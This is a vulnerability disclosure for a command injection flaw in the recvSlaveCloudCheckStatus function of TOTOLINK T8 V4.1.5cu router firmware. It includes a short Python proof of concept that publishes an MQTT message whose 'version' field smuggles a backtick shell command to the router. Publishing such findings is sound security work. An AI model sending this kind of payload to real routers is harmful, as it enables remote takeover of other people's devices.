# A command injection vulnerability in the function recvSlaveCloudCheckStatus of TOTOLINK Technology routers T8 V4.1.5cu allows attackers to execute arbitrary commands via a crafted MQTT packet.

## Description

A command injection vulnerability in the function recvSlaveCloudCheckStatus of TOTOLINK Technology routers T8 V4.1.5cu allows attackers to execute arbitrary commands via a crafted MQTT packet.

![image-20230116184500942](images/2.png)

## Firmware information

* Manufacturer's address:https://www.totolink.net/

![image-20230116184157081](images/1.png)

* Firmware download address : https://totolink.com.my/wp-content/uploads/2023/01/TOTOLINK_C8195R-1C_T8_IP04455_8197F_SPI_16M128M_V4.1.5cu.741_B20210916_ALL.zip

## Affected version

**Version: V4.1.5cu**

## Vulnerability details

The `T8` router opens the `MQTT` service

![image-20230116185238612](images/5.png)

In function `recvSlaveCloudCheckStatus`,The "version" parameter does not filter user input, which can cause command injection vulnerabilities



![image-20230116190613535](images/3.png)

POC

```
import paho.mqtt.client as mqtt
client = mqtt.Client()
client.connect("192.168.0.1",1883,60)
client.publish("totolink/router/recvSlaveCloudCheckStatus", b'{"version": ";`ls>/tmp/recvSlaveCloudCheckStatus.txt`;"}')
```

![image-20230116190718260](images/4.png)